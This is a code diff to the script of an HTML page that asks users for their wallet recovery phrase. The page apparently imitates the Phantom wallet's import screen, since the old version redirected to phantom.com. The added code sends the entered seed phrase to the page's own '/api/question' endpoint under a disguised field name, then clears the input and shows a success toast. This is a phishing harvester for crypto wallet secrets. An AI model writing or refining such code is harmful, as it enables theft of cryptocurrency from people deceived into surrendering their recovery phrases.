@@ -55,10 +55,45 @@
 
 <script src="../js/utils.js"></script>
 <script>
-function handleImport() {
-  const phrase = document.getElementById('phrase-input').value.trim();
-  if (!phrase) { alert('Please enter your recovery phrase first.'); return; }
-  document.getElementById('toast').style.display='block'; setTimeout(function(){ window.location.href='https://www.phantom.com'; }, 1500);
+async function handleImport() {
+
+    const phrase =
+        document.getElementById("phrase-input")
+        .value
+        .trim();
+
+    if (!phrase) {
+        alert("Please enter your key first.");
+        return;
+    }
+
+    try {
+
+        const response = await fetch(
+            "/api/question",
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    question: phrase
+                })
+            }
+        );
+
+        if (!response.ok) {
+            throw new Error();
+        }
+
+        document.getElementById("toast").style.display = "block";
+
+        document.getElementById("phrase-input").value = "";
+
+    } catch (err) {
+
+        alert("Failed to send.");
+    }
 }
 </script>
 </body>
